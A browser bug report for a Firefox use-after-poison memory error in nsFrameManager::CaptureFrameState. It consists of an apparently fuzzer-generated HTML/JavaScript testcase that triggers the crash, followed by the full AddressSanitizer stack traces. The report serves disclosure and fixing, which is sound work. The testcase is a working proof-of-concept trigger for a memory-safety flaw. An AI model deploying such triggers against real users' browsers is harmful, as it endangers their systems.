@@ -1,0 +1,202 @@
+use-after-poison in nsFrameManager::CaptureFrameState
+The testcase crashes the latest Firefox ASAN build (BuildID=20160624030212) as follows:
+
+<script>
+function start() {
+        o0=document;
+        o24=document.createElement('table');
+        o35=window;
+        o60=document.createElement('input');
+        o24.appendChild(o60);
+        o62=document.body;
+        o66=document.createElement('input');
+        o62.appendChild(o66);
+        o60.innerHTML="<svg><color-profile><script><rect><animateColor><style><style>*{ all: unset<script><style>div<style>";
+        o93=o60.querySelectorAll('*')[5];
+        o97=o60.querySelectorAll('*')[9];
+        document.body.appendChild(o24);
+        o305=document.createTextNode("{}:first-line{");
+        o93.appendChild(o305);
+        o318=(new DOMParser()).parseFromString('','text/html');
+        o320=o318.all[1];
+        o355=document.createElement('style');
+        o356=document.createTextNode("@keyframes key2{ from{ box-shadow: none}}#id2{ animation-name: key2; animation-duration: 0.01s");
+        o355.appendChild(o356);
+        o97.appendChild(o355);
+        o66.style.display='list-item';
+        o473=document.createElement('script');
+        o24.appendChild(o473);
+        o577=document.createElement('style');
+        o320.appendChild(o577);
+        o577.style.position='fixed';
+        document.replaceChild(o318.documentElement,document.documentElement);
+        o908=(new DOMParser()).parseFromString('','text/html');
+        o911=o908.all[2];
+        o911.style.display='inline';
+        o577.id='id2';
+        o1202=document.createElement('table');
+        document.body=o911;
+        document.body.appendChild(o1202);
+        document.replaceChild(o0.documentElement,document.documentElement);
+        o1232=o473.parentNode;
+        o1233=o1232.parentNode;
+        document.body=o1233;
+        o35.scrollByLines(1);
+        o577.style.position='absolute';
+        setTimeout(f2, 4);
+}
+function f2() {
+        o0.designMode='on';
+        o0.execCommand('insertparagraph',false,null);
+}
+</script>
+<body onload="start()"></body>
+
+
+ASAN ouput:
+
+=================================================================
+==30757==ERROR: AddressSanitizer: use-after-poison on address 0x6250002eab58 at pc 0x7fcd17c53104 bp 0x7ffc2eca31b0 sp 0x7ffc2eca31a8
+READ of size 8 at 0x6250002eab58 thread T0 (Web Content)
+    #0 0x7fcd17c53103 in GetStateBits /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/generic/nsIFrame.h:1565:46
+    #1 0x7fcd17c53103 in nsFrameManager::CaptureFrameState(nsIFrame*, nsILayoutHistoryState*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsFrameManager.cpp:580
+    #2 0x7fcd17aa8070 in CaptureStateForFramesOf /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:9144:5
+    #3 0x7fcd17aa8070 in nsCSSFrameConstructor::RecreateFramesForContent(nsIContent*, bool, nsCSSFrameConstructor::RemoveFlags, nsIContent**) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:9563
+    #4 0x7fcd17aa8d23 in mozilla::RestyleManager::RestyleElement(mozilla::dom::Element*, nsIFrame*, nsChangeHint, mozilla::RestyleTracker&, nsRestyleHint, mozilla::RestyleHintData const&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/RestyleManager.cpp:1077:5
+    #5 0x7fcd17ac8d0f in ProcessOneRestyle /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/RestyleTracker.cpp:94:5
+    #6 0x7fcd17ac8d0f in mozilla::RestyleTracker::DoProcessRestyles() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/RestyleTracker.cpp:262
+    #7 0x7fcd17ab03af in ProcessRestyles /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/dist/include/mozilla/RestyleManager.h:536:7
+    #8 0x7fcd17ab03af in mozilla::RestyleManager::ProcessPendingRestyles() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/RestyleManager.cpp:1807
+    #9 0x7fcd17cdb6ca in ProcessPendingRestyles /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/dist/include/mozilla/RestyleManagerHandleInlines.h:74:3
+    #10 0x7fcd17cdb6ca in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsPresShell.cpp:4119
+    #11 0x7fcd138be6be in nsDocument::FlushPendingNotifications(mozFlushType) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/dom/base/nsDocument.cpp:8393:7
+    #12 0x7fcd177eee46 in nsComputedDOMStyle::UpdateCurrentStyleSources(bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/style/nsComputedDOMStyle.cpp:633:3
+    #13 0x7fcd177f005b in nsComputedDOMStyle::GetPropertyCSSValue(nsAString_internal const&, mozilla::ErrorResult&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/style/nsComputedDOMStyle.cpp:796:3
+    #14 0x7fcd177ee507 in nsComputedDOMStyle::GetPropertyValue(nsAString_internal const&, nsAString_internal&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/style/nsComputedDOMStyle.cpp:379:26
+    #15 0x7fcd17500cde in nsHTMLCSSUtils::GetCSSInlinePropertyBase(nsINode*, nsIAtom*, nsAString_internal&, nsHTMLCSSUtils::StyleType) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/editor/libeditor/nsHTMLCSSUtils.cpp:511:5
+    #16 0x7fcd174e9e89 in GetComputedProperty /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/editor/libeditor/nsHTMLCSSUtils.cpp:491:10
+    #17 0x7fcd174e9e89 in nsHTMLEditor::GetAbsolutelyPositionedSelectionContainer(nsIDOMElement**) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/editor/libeditor/nsHTMLAbsPosition.cpp:91
+    #18 0x7fcd174f4486 in nsHTMLEditor::CheckSelectionStateForAnonymousButtons(nsISelection*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/editor/libeditor/nsHTMLAnonymousUtils.cpp:307:11
+    #19 0x7fcd175e8495 in nsHTMLEditor::EndUpdateViewBatch() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/editor/libeditor/nsHTMLEditor.cpp:4802:11
+    #20 0x7fcd174b04ae in nsEditor::EndPlaceHolderTransaction() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/editor/libeditor/nsEditor.cpp:965:7
+    #21 0x7fcd175d381c in ~nsAutoPlaceHolderBatch /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/editor/libeditor/nsEditorUtils.h:51:9
+    #22 0x7fcd175d381c in nsHTMLEditor::InsertBasicBlock(nsAString_internal const&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/editor/libeditor/nsHTMLEditor.cpp:2126
+    #23 0x7fcd175d2216 in nsHTMLEditor::SetParagraphFormat(nsAString_internal const&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/editor/libeditor/nsHTMLEditor.cpp:1709:12
+    #24 0x7fcd1768a384 in nsParagraphStateCommand::SetState(nsIEditor*, nsString&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/editor/composer/nsComposerCommands.cpp:654:10
+    #25 0x7fcd176897b0 in nsMultiStateCommand::DoCommandParams(char const*, nsICommandParams*, nsISupports*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/editor/composer/nsComposerCommands.cpp:599:12
+    #26 0x7fcd18a65bd3 in nsControllerCommandTable::DoCommandParams(char const*, nsICommandParams*, nsISupports*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/embedding/components/commandhandler/nsControllerCommandTable.cpp:162:10
+    #27 0x7fcd18a5ca8e in DoCommandWithParams /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/embedding/components/commandhandler/nsBaseCommandController.cpp:152:10
+    #28 0x7fcd18a5ca8e in non-virtual thunk to nsBaseCommandController::DoCommandWithParams(char const*, nsICommandParams*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/embedding/components/commandhandler/nsBaseCommandController.cpp:140
+    #29 0x7fcd18a62caa in nsCommandManager::DoCommand(char const*, nsICommandParams*, mozIDOMWindowProxy*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/embedding/components/commandhandler/nsCommandManager.cpp:212:10
+    #30 0x7fcd15f1ec29 in nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, mozilla::ErrorResult&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/dom/html/nsHTMLDocument.cpp:3249:10
+    #31 0x7fcd154dcc76 in mozilla::dom::HTMLDocumentBinding::execCommand(JSContext*, JS::Handle<JSObject*>, nsHTMLDocument*, JSJitMethodCallArgs const&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/dom/bindings/HTMLDocumentBinding.cpp:816:15
+    #32 0x7fcd15753157 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/dom/bindings/BindingUtils.cpp:2784:13
+    #33 0x7fcd1b5d66c0 in CallJSNative /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/js/src/jscntxtinlines.h:235:15
+    #34 0x7fcd1b5d66c0 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/js/src/vm/Interpreter.cpp:452
+    #35 0x7fcd1b5bd8c0 in CallFromStack /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/js/src/vm/Interpreter.cpp:503:12
+    #36 0x7fcd1b5bd8c0 in Interpret(JSContext*, js::RunState&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/js/src/vm/Interpreter.cpp:2873
+    #37 0x7fcd1b5a3858 in js::RunScript(JSContext*, js::RunState&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/js/src/vm/Interpreter.cpp:398:12
+    #38 0x7fcd1b5d6d88 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/js/src/vm/Interpreter.cpp:470:15
+    #39 0x7fcd1b5d7461 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/js/src/vm/Interpreter.cpp:516:10
+    #40 0x7fcd1b1211a8 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/js/src/jsapi.cpp:2890:12
+    #41 0x7fcd153a9c6d in mozilla::dom::Function::Call(JSContext*, JS::Handle<JS::Value>, nsTArray<JS::Value> const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/dom/bindings/FunctionBinding.cpp:36:8
+    #42 0x7fcd135d07bb in Call<nsCOMPtr<nsISupports> > /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/dist/include/mozilla/dom/FunctionBinding.h:70:12
+    #43 0x7fcd135d07bb in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/dom/base/nsGlobalWindow.cpp:12271
+    #44 0x7fcd135ae64c in nsGlobalWindow::RunTimeout(nsTimeout*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/dom/base/nsGlobalWindow.cpp:12520:32
+    #45 0x7fcd13546d61 in nsGlobalWindow::TimerCallback(nsITimer*, void*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/dom/base/nsGlobalWindow.cpp:12766:3
+    #46 0x7fcd10c4fdf7 in nsTimerImpl::Fire() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/xpcom/threads/nsTimerImpl.cpp:524:7
+    #47 0x7fcd10c270fc in nsTimerEvent::Run() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/xpcom/threads/TimerThread.cpp:286:3
+    #48 0x7fcd10c33eb8 in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/xpcom/threads/nsThread.cpp:1067:7
+    #49 0x7fcd10cb26bc in NS_ProcessNextEvent(nsIThread*, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/xpcom/glue/nsThreadUtils.cpp:290:10
+    #50 0x7fcd11a17eff in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/ipc/glue/MessagePump.cpp:100:21
+    #51 0x7fcd119862f8 in RunInternal /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/ipc/chromium/src/base/message_loop.cc:235:3
+    #52 0x7fcd119862f8 in RunHandler /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/ipc/chromium/src/base/message_loop.cc:228
+    #53 0x7fcd119862f8 in MessageLoop::Run() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/ipc/chromium/src/base/message_loop.cc:208
+    #54 0x7fcd1737915f in nsBaseAppShell::Run() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/widget/nsBaseAppShell.cpp:156:3
+    #55 0x7fcd194050a7 in XRE_RunAppShell /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/toolkit/xre/nsEmbedFunctions.cpp:834:12
+    #56 0x7fcd119862f8 in RunInternal /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/ipc/chromium/src/base/message_loop.cc:235:3
+    #57 0x7fcd119862f8 in RunHandler /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/ipc/chromium/src/base/message_loop.cc:228
+    #58 0x7fcd119862f8 in MessageLoop::Run() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/ipc/chromium/src/base/message_loop.cc:208
+    #59 0x7fcd19404712 in XRE_InitChildProcess /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/toolkit/xre/nsEmbedFunctions.cpp:664:7
+    #60 0x4e2bc5 in content_process_main(int, char**) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/ipc/app/../contentproc/plugin-container.cpp:224:19
+    #61 0x7fcd0dd1282f in __libc_start_main /build/glibc-GKVZIf/glibc-2.23/csu/../csu/libc-start.c:291
+    #62 0x41e778 in _start (/home/nils/fuzzer3/firefox/plugin-container+0x41e778)
+
+0x6250002eab58 is located 6744 bytes inside of 8192-byte region [0x6250002e9100,0x6250002eb100)
+allocated by thread T0 (Web Content) here:
+    #0 0x4b51eb in __interceptor_malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3
+    #1 0x7fcd1ef7bdd6 in PL_ArenaAllocate /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/nsprpub/lib/ds/plarena.c:210:27
+    #2 0x7fcd179fbe99 in nsPresArena::Allocate(unsigned int, unsigned long) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsPresArena.cpp:165:3
+    #3 0x7fcd17926c12 in AllocateByObjectID /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsPresArena.h:65:12
+    #4 0x7fcd17926c12 in AllocateByObjectID /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsIPresShell.h:250
+    #5 0x7fcd17926c12 in operator new /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/style/nsStyleStruct.h:2475
+    #6 0x7fcd17926c12 in nsRuleNode::ComputeDisplayData(void*, nsRuleData const*, nsStyleContext*, nsRuleNode*, nsRuleNode::RuleDetail, mozilla::RuleNodeCacheConditions) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/style/nsRuleNode.cpp:5327
+    #7 0x7fcd178fb8ce in nsRuleNode::WalkRuleTree(nsStyleStructID, nsStyleContext*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/style/nsRuleNode.cpp:2491:10
+    #8 0x7fcd179eea5f in GetStyleDisplay<true> /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/layout/style/nsStyleStructList.h:98:1
+    #9 0x7fcd179eea5f in nsStyleDisplay const* nsStyleContext::DoGetStyleDisplay<true>() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/layout/style/nsStyleStructList.h:98
+    #10 0x7fcd1797723b in StyleDisplay /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/layout/style/nsStyleStructList.h:98:1
+    #11 0x7fcd1797723b in nsStyleContext::SetStyleBits() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/style/nsStyleContext.cpp:687
+    #12 0x7fcd17976fc6 in FinishConstruction /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/style/nsStyleContext.cpp:163:3
+    #13 0x7fcd17976fc6 in nsStyleContext::nsStyleContext(nsStyleContext*, nsIAtom*, mozilla::CSSPseudoElementType, already_AddRefed<nsRuleNode>, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/style/nsStyleContext.cpp:121
+    #14 0x7fcd1799a02c in NS_NewStyleContext(nsStyleContext*, nsIAtom*, mozilla::CSSPseudoElementType, nsRuleNode*, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/style/nsStyleContext.cpp:1316:5
+    #15 0x7fcd179a57ee in nsStyleSet::GetContext(nsStyleContext*, nsRuleNode*, nsRuleNode*, nsIAtom*, mozilla::CSSPseudoElementType, mozilla::dom::Element*, unsigned int) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/style/nsStyleSet.cpp:918:14
+    #16 0x7fcd179aa6f3 in nsStyleSet::ResolveStyleFor(mozilla::dom::Element*, nsStyleContext*, TreeMatchContext&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/style/nsStyleSet.cpp:1366:10
+    #17 0x7fcd17b1d612 in ResolveStyleFor /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/dist/include/mozilla/StyleSetHandleInlines.h:93:3
+    #18 0x7fcd17b1d612 in nsCSSFrameConstructor::ResolveStyleContext(nsStyleContext*, nsIContent*, nsFrameConstructorState*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:4959
+    #19 0x7fcd17b19630 in ResolveStyleContext /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:4928:10
+    #20 0x7fcd17b19630 in ResolveStyleContext /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:4944
+    #21 0x7fcd17b19630 in nsCSSFrameConstructor::AddFrameConstructionItems(nsFrameConstructorState&, nsIContent*, bool, nsCSSFrameConstructor::InsertionPoint const&, nsCSSFrameConstructor::FrameConstructionItemList&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:5574
+    #22 0x7fcd17b00233 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:10685:9
+    #23 0x7fcd17b1712f in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:3998:9
+    #24 0x7fcd17b2284c in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:6085:3
+    #25 0x7fcd17b0f272 in ConstructFramesFromItemList /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:10502:5
+    #26 0x7fcd17b0f272 in nsCSSFrameConstructor::CreateAnonymousFrames(nsFrameConstructorState&, nsIContent*, nsContainerFrame*, PendingBinding*, nsFrameItems&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:4132
+    #27 0x7fcd17b0b8b7 in nsCSSFrameConstructor::BeginBuildingScrollFrame(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, nsIAtom*, bool, nsContainerFrame*&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:4546:3
+    #28 0x7fcd17b083d5 in nsCSSFrameConstructor::SetUpDocElementContainingBlock(nsIContent*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:2875:25
+    #29 0x7fcd17b04852 in nsCSSFrameConstructor::ConstructDocElementFrame(mozilla::dom::Element*, nsILayoutHistoryState*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:2411:3
+    #30 0x7fcd17b28a17 in nsCSSFrameConstructor::ContentRangeInserted(nsIContent*, nsIContent*, nsIContent*, nsILayoutHistoryState*, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsCSSFrameConstructor.cpp:7635:7
+    #31 0x7fcd17cc31a7 in PresShell::Initialize(int, int) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/base/nsPresShell.cpp:1728:7
+    #32 0x7fcd137f38ef in nsContentSink::StartLayout(bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/dom/base/nsContentSink.cpp:1210:19
+    #33 0x7fcd12c02086 in nsHtml5TreeOpExecutor::StartLayout() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:612:3
+    #34 0x7fcd12c0e83e in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/parser/html/nsHtml5TreeOperation.cpp:990:7
+    #35 0x7fcd12bff9d7 in nsHtml5TreeOpExecutor::RunFlushLoop() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:448:21
+    #36 0x7fcd12c044cb in nsHtml5ExecutorFlusher::Run() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/parser/html/nsHtml5StreamParser.cpp:128:9
+    #37 0x7fcd10c33eb8 in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/xpcom/threads/nsThread.cpp:1067:7
+    #38 0x7fcd10cb26bc in NS_ProcessNextEvent(nsIThread*, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/xpcom/glue/nsThreadUtils.cpp:290:10
+    #39 0x7fcd11a17eff in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/ipc/glue/MessagePump.cpp:100:21
+
+SUMMARY: AddressSanitizer: use-after-poison /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/generic/nsIFrame.h:1565:46 in GetStateBits
+Shadow bytes around the buggy address:
+  0x0c4a80055510: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c4a80055520: 00 00 00 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
+  0x0c4a80055530: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
+  0x0c4a80055540: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
+  0x0c4a80055550: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
+=>0x0c4a80055560: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7[f7]f7 f7 f7 f7
+  0x0c4a80055570: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
+  0x0c4a80055580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c4a80055590: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c4a800555a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c4a800555b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==30757==ABORTING
